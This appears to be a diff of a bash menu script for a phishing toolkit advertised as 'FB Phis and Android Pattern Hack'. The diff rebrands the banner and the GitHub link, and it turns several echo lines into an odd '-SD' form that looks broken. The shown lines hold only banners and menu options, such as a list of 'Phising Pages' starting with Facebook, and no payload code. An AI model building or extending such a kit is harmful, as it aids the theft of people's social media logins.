@@ -1,6 +1,6 @@
 function tool() {
 clear
-toilet -f mono12 -F gay "AIOP"
+toilet -f mono12 -F gay "SDMH"
 echo ""
 echo -e "\e[96m           ------- SDMH-Hacking-TV 2021--------\e[0m";
 echo -e "\e[95m----------- FB Phis and Android Pattern Hack ---------------\e[0m";
@@ -8,7 +8,7 @@ echo -e "\e[93m----------- Facebook - SDMH-Hacking-TV -----------\e[0m";
 echo ""
 echo ""
 echo CODED BY ISURUWA | lolcat -a
-echo -e "";
+echo -SD "";
 echo -e "\e[93m[*] Phising Pages\e[0m";
 echo -e "";
 echo -e "\e[91m1.Facebook\e[0m";
@@ -109,7 +109,7 @@ echo -e "\e[93m----------- Whatsapp - +947793191314 -----\e[0m";
 echo ""
 echo ""
 echo  CODED BY ISURUWA | lolcat -a
-echo -e "";
+echo -SD "";
 echo -e "\e[91m1.Start Tool\e[0m";
 echo -e "\e[92m2.Saved Data\e[0m";
 echo -e "\e[93m3.Update\e[0m";
@@ -138,7 +138,7 @@ then
 fi
 if [ "${userinput1:-}" = "5" ]
 then
-	am start -a android.intent.action.VIEW -d https://github.com/isuruwa 
+	am start -a android.intent.action.VIEW -d https://github.com/SDMH-Hacking-TV
 	bash aiop.sh
 fi
 if [ "${userinput1:-}" = "6" ]
